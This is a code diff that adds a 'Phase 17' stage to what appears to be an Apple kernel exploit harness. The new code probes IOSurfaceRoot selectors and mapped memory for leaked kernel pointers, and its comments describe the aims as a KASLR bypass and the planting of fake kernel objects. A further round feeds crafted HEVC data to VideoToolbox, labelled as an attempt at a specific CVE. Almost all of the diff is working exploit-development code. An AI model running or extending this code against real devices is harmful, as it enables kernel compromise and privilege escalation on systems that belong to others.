@@ -16889,6 +16889,10 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
+        if (rounds >= 170 && rounds <= 179) {
+            rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
+            goto phase16_done;
+        }
 
         /* Open IOSurfaceRoot user client */
         io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
@@ -19953,6 +19957,377 @@ new_modes:
         }
         phase16_done:
         rlog("--- Phase 16 complete ---\n");
+
+        /*
+         * Phase 17: IOSurface shared memory kernel address discovery
+         *
+         * Goal: Map IOSurface shared memory into userspace and discover
+         * its kernel virtual address. This shared region lets us:
+         *   - Craft fake kernel objects in memory we control
+         *   - Use slot 2 to point INTO our shared memory
+         *   - Read results back from kernel operations
+         *
+         * rounds=170: Probe IOSurface shared memory layout + kernel address leak
+         *   - Create IOSurface, lock it, get base address
+         *   - Use IOSurface properties (setValue/copyValue) to probe kernel state
+         *   - Try to find kernel address of IOSurface object via IOKit properties
+         *   - Enumerate all accessible IOSurface selectors for data return paths
+         *
+         * rounds=171: Test IOSurface selector data return paths
+         *   - For each IOSurface selector that returns structureOutput,
+         *     check if any returned data contains kernel pointers
+         *   - This is our KASLR bypass search
+         *
+         * rounds=172: Controlled groom + slot 2 → shared memory pointer
+         *   - If we can discover the kernel VA of our shared memory,
+         *     point slot 2 there and verify the kernel reads from it safely
+         *
+         * rounds=173: VideoToolbox CVE-2026-112466 KASLR bypass attempt
+         *   - Create VideoToolbox session, fuzz parameters for OOB read
+         *   - Look for kernel pointer leaks in output buffers
+         */
+        if (rounds >= 170 && rounds <= 179) {
+            rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
+
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC),
+                dispatch_get_global_queue(0, 0), ^{
+                    rlog("  WATCHDOG: 30s — terminating\n");
+                    if (g_log) { fclose(g_log); g_log = NULL; }
+                    _exit(42);
+                });
+
+            io_service_t svc17 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc17) { rlog("  Phase 17: service lookup failed\n"); goto phase17_done; }
+
+            io_connect_t conn17 = IO_OBJECT_NULL;
+            kern_return_t kr17 = IOServiceOpen(svc17, mach_task_self(), 0, &conn17);
+            if (kr17 != KERN_SUCCESS) {
+                rlog("  Phase 17: IOServiceOpen failed: 0x%x\n", kr17);
+                IOObjectRelease(svc17);
+                goto phase17_done;
+            }
+
+            if (rounds == 170) {
+                /*
+                 * Probe IOSurface shared memory layout and try to leak kernel pointers
+                 * through IOKit external methods that return structureOutput.
+                 */
+                rlog("  === r=170: IOSurface selector output scan ===\n");
+
+                /* Create a surface with shared memory */
+                CFMutableDictionaryRef sp17 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w17 = 64, h17 = 64, bpe17 = 4;
+                CFNumberRef wn17 = CFNumberCreate(NULL, kCFNumberIntType, &w17);
+                CFNumberRef hn17 = CFNumberCreate(NULL, kCFNumberIntType, &h17);
+                CFNumberRef bn17 = CFNumberCreate(NULL, kCFNumberIntType, &bpe17);
+                int pf17 = 0x42475241; /* 'BGRA' */
+                CFNumberRef pfn17 = CFNumberCreate(NULL, kCFNumberIntType, &pf17);
+                CFDictionarySetValue(sp17, CFSTR("IOSurfaceWidth"), wn17);
+                CFDictionarySetValue(sp17, CFSTR("IOSurfaceHeight"), hn17);
+                CFDictionarySetValue(sp17, CFSTR("IOSurfaceBytesPerElement"), bn17);
+                CFDictionarySetValue(sp17, CFSTR("IOSurfacePixelFormat"), pfn17);
+                IOSurfaceRef surf17 = IOSurfaceCreate(sp17);
+                rlog("  IOSurface create: %s\n", surf17 ? "OK" : "FAIL");
+                if (surf17) {
+                    IOSurfaceID sid17 = IOSurfaceGetID(surf17);
+                    rlog("  SurfaceID: %u\n", sid17);
+                    rlog("  AllocSize: %zu\n", IOSurfaceGetAllocSize(surf17));
+                    rlog("  BytesPerRow: %zu\n", IOSurfaceGetBytesPerRow(surf17));
+
+                    IOSurfaceLock(surf17, 0, NULL);
+                    void *base17 = IOSurfaceGetBaseAddress(surf17);
+                    rlog("  BaseAddress (userspace): %p\n", base17);
+                    IOSurfaceUnlock(surf17, 0, NULL);
+
+                    /* Write a known pattern into shared memory */
+                    IOSurfaceLock(surf17, 0, NULL);
+                    memset(base17, 0x41, 256);
+                    uint64_t *p17 = (uint64_t *)base17;
+                    p17[0] = 0x4141414141414141ULL;
+                    p17[1] = 0x4242424242424242ULL;
+                    p17[2] = 0x4343434343434343ULL;
+                    p17[3] = 0x4444444444444444ULL;
+                    IOSurfaceUnlock(surf17, 0, NULL);
+
+                    /* Mach port for the surface */
+                    mach_port_t surfport17 = IOSurfaceCreateMachPort(surf17);
+                    rlog("  MachPort: 0x%x\n", surfport17);
+
+                    /*
+                     * Scan ALL IOSurfaceRootUserClient selectors for structureOutput.
+                     * Any selector that returns data might leak kernel pointers.
+                     */
+                    rlog("\n  --- Selector output scan (structureOutput) ---\n");
+                    for (uint32_t sel = 0; sel <= 40; sel++) {
+                        uint8_t out_buf[4096];
+                        memset(out_buf, 0xEE, sizeof(out_buf));
+                        size_t out_sz = sizeof(out_buf);
+
+                        /* Try sync call with surface ID as scalar input */
+                        uint64_t sc_in[4] = { sid17, 0, 0, 0 };
+                        uint32_t sc_out_cnt = 16;
+                        uint64_t sc_out[16];
+                        memset(sc_out, 0, sizeof(sc_out));
+
+                        kr17 = IOConnectCallMethod(conn17, sel,
+                            sc_in, 1, NULL, 0,
+                            sc_out, &sc_out_cnt, out_buf, &out_sz);
+
+                        if (kr17 == KERN_SUCCESS || kr17 == 0xe00002bc /* MIG type error but partial data */) {
+                            rlog("  sel%u: OK sc_out_cnt=%u struct_out_sz=%zu\n",
+                                 sel, sc_out_cnt, out_sz);
+
+                            /* Check scalar outputs for kernel pointers */
+                            for (uint32_t j = 0; j < sc_out_cnt; j++) {
+                                if ((sc_out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (sc_out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
+                                    (sc_out[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                    rlog("  *** sel%u: sc_out[%u] = 0x%llx (POSSIBLE KPTR!) ***\n",
+                                         sel, j, (unsigned long long)sc_out[j]);
+                                }
+                            }
+
+                            /* Check struct output for kernel pointers */
+                            if (out_sz > 0) {
+                                uint64_t *op = (uint64_t *)out_buf;
+                                size_t nq = out_sz / 8;
+                                for (size_t q = 0; q < nq && q < 64; q++) {
+                                    if ((op[q] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                        (op[q] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
+                                        (op[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                        rlog("  *** sel%u: struct_out[%zu] = 0x%llx (POSSIBLE KPTR!) ***\n",
+                                             sel, q, (unsigned long long)op[q]);
+                                    }
+                                }
+                            }
+                        } else if (kr17 != 0xE00002C2 && kr17 != 0xe00002bd) {
+                            /* Skip BadArg and unsupported — log unexpected errors */
+                            rlog("  sel%u: err=0x%x\n", sel, kr17);
+                        }
+                    }
+
+                    /* Also try with structureInput = surfaceID as 4-byte int */
+                    rlog("\n  --- Selector output scan (structureInput=surfID) ---\n");
+                    for (uint32_t sel = 0; sel <= 40; sel++) {
+                        uint8_t out_buf2[4096];
+                        memset(out_buf2, 0xEE, sizeof(out_buf2));
+                        size_t out_sz2 = sizeof(out_buf2);
+                        uint32_t sid_in = sid17;
+
+                        uint32_t sc_out_cnt2 = 16;
+                        uint64_t sc_out2[16];
+                        memset(sc_out2, 0, sizeof(sc_out2));
+
+                        kr17 = IOConnectCallMethod(conn17, sel,
+                            NULL, 0, &sid_in, sizeof(sid_in),
+                            sc_out2, &sc_out_cnt2, out_buf2, &out_sz2);
+
+                        if (kr17 == KERN_SUCCESS) {
+                            rlog("  sel%u(si): OK sc_out_cnt=%u struct_out_sz=%zu\n",
+                                 sel, sc_out_cnt2, out_sz2);
+
+                            /* Check for kernel pointers */
+                            for (uint32_t j = 0; j < sc_out_cnt2; j++) {
+                                if ((sc_out2[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                    rlog("  *** sel%u(si): sc_out[%u] = 0x%llx (POSSIBLE KPTR!) ***\n",
+                                         sel, j, (unsigned long long)sc_out2[j]);
+                                }
+                            }
+                            if (out_sz2 > 0) {
+                                uint64_t *op2 = (uint64_t *)out_buf2;
+                                size_t nq2 = out_sz2 / 8;
+                                for (size_t q = 0; q < nq2 && q < 64; q++) {
+                                    if ((op2[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                        rlog("  *** sel%u(si): struct_out[%zu] = 0x%llx (POSSIBLE KPTR!) ***\n",
+                                             sel, q, (unsigned long long)op2[q]);
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    if (surfport17 != MACH_PORT_NULL)
+                        mach_port_deallocate(mach_task_self(), surfport17);
+                    CFRelease(surf17);
+                }
+                CFRelease(sp17); CFRelease(wn17); CFRelease(hn17);
+                CFRelease(bn17); CFRelease(pfn17);
+
+            } else if (rounds == 171) {
+                /*
+                 * Deeper probe: use IOConnectCallAsyncMethod with structureOutput
+                 * on selectors that might return data with async notification.
+                 * Also try IOConnectMapMemory to find kernel-mapped regions.
+                 */
+                rlog("  === r=171: IOConnectMapMemory + async output scan ===\n");
+
+                /* Try IOConnectMapMemory for all memory types 0-15 */
+                rlog("\n  --- IOConnectMapMemory scan ---\n");
+                for (uint32_t memtype = 0; memtype < 16; memtype++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t size = 0;
+                    kr17 = IOConnectMapMemory64(conn17, memtype, mach_task_self(),
+                        &addr, &size, kIOMapAnywhere);
+                    if (kr17 == KERN_SUCCESS) {
+                        rlog("  *** memtype %u: addr=0x%llx size=0x%llx ***\n",
+                             memtype, (unsigned long long)addr, (unsigned long long)size);
+
+                        /* Scan mapped region for kernel pointers */
+                        uint64_t *mp = (uint64_t *)(uintptr_t)addr;
+                        size_t nqm = (size < 4096 ? size : 4096) / 8;
+                        int found_kptr = 0;
+                        for (size_t q = 0; q < nqm; q++) {
+                            if ((mp[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                if (found_kptr < 10) {
+                                    rlog("  *** memtype %u offset +0x%zx: 0x%llx (KPTR!) ***\n",
+                                         memtype, q * 8, (unsigned long long)mp[q]);
+                                }
+                                found_kptr++;
+                            }
+                        }
+                        if (found_kptr > 10)
+                            rlog("  *** memtype %u: %d total KPTRs found ***\n",
+                                 memtype, found_kptr);
+
+                        IOConnectUnmapMemory64(conn17, memtype, mach_task_self(), addr);
+                    } else if (kr17 != 0xE00002C2 && kr17 != 0xe00002bd) {
+                        rlog("  memtype %u: err=0x%x\n", memtype, kr17);
+                    }
+                }
+
+                /* Try IOConnectCallAsyncMethod with structureOutput for sel 0-15 */
+                rlog("\n  --- Async selector output scan ---\n");
+                mach_port_t awp17 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &awp17);
+                mach_port_insert_right(mach_task_self(), awp17, awp17, MACH_MSG_TYPE_MAKE_SEND);
+
+                for (uint32_t sel = 0; sel <= 30; sel++) {
+                    uint8_t aout[4096];
+                    memset(aout, 0xEE, sizeof(aout));
+                    size_t aout_sz = sizeof(aout);
+                    uint64_t aref = 0xAA00000000000000ULL | sel;
+                    uint32_t asc_cnt = 16;
+                    uint64_t asc_out[16];
+                    memset(asc_out, 0, sizeof(asc_out));
+
+                    kr17 = IOConnectCallAsyncMethod(conn17, sel, awp17, &aref, 1,
+                        NULL, 0, NULL, 0,
+                        asc_out, &asc_cnt, aout, &aout_sz);
+
+                    if (kr17 == KERN_SUCCESS) {
+                        rlog("  async sel%u: OK sc_out_cnt=%u struct_out_sz=%zu\n",
+                             sel, asc_cnt, aout_sz);
+                        for (uint32_t j = 0; j < asc_cnt; j++) {
+                            if ((asc_out[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                rlog("  *** async sel%u: sc_out[%u] = 0x%llx (KPTR!) ***\n",
+                                     sel, j, (unsigned long long)asc_out[j]);
+                            }
+                        }
+                        if (aout_sz > 0 && aout_sz < sizeof(aout)) {
+                            uint64_t *aop = (uint64_t *)aout;
+                            size_t nqa = aout_sz / 8;
+                            for (size_t q = 0; q < nqa && q < 64; q++) {
+                                if ((aop[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                    rlog("  *** async sel%u: struct_out[%zu] = 0x%llx (KPTR!) ***\n",
+                                         sel, q, (unsigned long long)aop[q]);
+                                }
+                            }
+                        }
+                    }
+                }
+                mach_port_deallocate(mach_task_self(), awp17);
+
+            } else if (rounds == 173) {
+                /*
+                 * VideoToolbox CVE-2026-112466 KASLR bypass attempt.
+                 * Create a VTDecompressionSession with crafted parameters
+                 * and check output pixel buffers for leaked kernel pointers.
+                 */
+                rlog("  === r=173: VideoToolbox KASLR bypass probe ===\n");
+
+                /* Create MV-HEVC format description with crafted NAL */
+                uint8_t sps[] = {
+                    0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
+                    0x00, 0x90, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
+                    0x00, 0x5D, 0xA0, 0x02, 0x80, 0x80, 0x24, 0x1F,
+                    0xE5, 0x93, 0x24, 0xBB, 0x94, 0x82, 0x42, 0x00
+                };
+                uint8_t pps[] = {
+                    0x44, 0x01, 0xC1, 0x73, 0xD0, 0x89, 0x12, 0x40
+                };
+                uint8_t vps[] = {
+                    0x40, 0x01, 0x0C, 0x01, 0xFF, 0xFF, 0x01, 0x60,
+                    0x00, 0x00, 0x03, 0x00, 0x90, 0x00, 0x00, 0x03,
+                    0x00, 0x00, 0x03, 0x00, 0x5D, 0x95, 0x98, 0x09
+                };
+
+                const uint8_t *params[3] = { vps, sps, pps };
+                size_t paramSizes[3] = { sizeof(vps), sizeof(sps), sizeof(pps) };
+
+                CMFormatDescriptionRef fmt17 = NULL;
+                OSStatus st17 = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                    NULL, 3, params, paramSizes, 4, NULL, &fmt17);
+                rlog("  HEVC format: %s (st=%d)\n", fmt17 ? "OK" : "FAIL", (int)st17);
+
+                if (fmt17) {
+                    /* Create decompression session */
+                    CFMutableDictionaryRef destAttrs = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int pixfmt = kCVPixelFormatType_420YpCbCr8BiPlanarFullRange;
+                    CFNumberRef pfnum = CFNumberCreate(NULL, kCFNumberIntType, &pixfmt);
+                    CFDictionarySetValue(destAttrs, kCVPixelBufferPixelFormatTypeKey, pfnum);
+
+                    VTDecompressionSessionRef dec17 = NULL;
+                    VTDecompressionOutputCallbackRecord cb17 = { NULL, NULL };
+                    st17 = VTDecompressionSessionCreate(NULL, fmt17, NULL, destAttrs, &cb17, &dec17);
+                    rlog("  Decompress session: %s (st=%d)\n", dec17 ? "OK" : "FAIL", (int)st17);
+
+                    if (dec17) {
+                        /* Craft a minimal HEVC slice NAL to trigger decode path */
+                        uint8_t slice_nal[64];
+                        memset(slice_nal, 0, sizeof(slice_nal));
+                        /* NAL header: 0x26 0x01 = type 19 (IDR_W_RADL) */
+                        slice_nal[0] = 0x00; slice_nal[1] = 0x00;
+                        slice_nal[2] = 0x00; slice_nal[3] = 0x3C; /* length = 60 */
+                        slice_nal[4] = 0x26; slice_nal[5] = 0x01; /* IDR slice */
+                        /* Minimal slice header bits */
+                        slice_nal[6] = 0x80; /* first_slice_segment_in_pic_flag=1 */
+
+                        CMBlockBufferRef blk17 = NULL;
+                        CMBlockBufferCreateWithMemoryBlock(NULL, slice_nal, sizeof(slice_nal),
+                            kCFAllocatorNull, NULL, 0, sizeof(slice_nal), 0, &blk17);
+
+                        CMSampleBufferRef sample17 = NULL;
+                        CMSampleTimingInfo timing17 = { CMTimeMake(1, 30), CMTimeMake(0, 30), CMTimeMake(0, 30) };
+                        size_t sampleSize17 = sizeof(slice_nal);
+                        CMSampleBufferCreate(NULL, blk17, TRUE, NULL, NULL, fmt17,
+                            1, 1, &timing17, 1, &sampleSize17, &sample17);
+
+                        if (sample17) {
+                            VTDecodeFrameFlags flags17 = kVTDecodeFrame_DoNotOutputFrame;
+                            VTDecodeInfoFlags info17 = 0;
+                            st17 = VTDecompressionSessionDecodeFrame(dec17, sample17,
+                                flags17, NULL, &info17);
+                            rlog("  Decode attempt: st=%d info=0x%x\n", (int)st17, (uint32_t)info17);
+                            CFRelease(sample17);
+                        }
+                        if (blk17) CFRelease(blk17);
+                        VTDecompressionSessionInvalidate(dec17);
+                        CFRelease(dec17);
+                    }
+                    CFRelease(pfnum);
+                    CFRelease(destAttrs);
+                    CFRelease(fmt17);
+                }
+            }
+
+            IOServiceClose(conn17);
+            IOObjectRelease(svc17);
+        }
+        phase17_done:
+        rlog("--- Phase 17 complete ---\n");
 
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
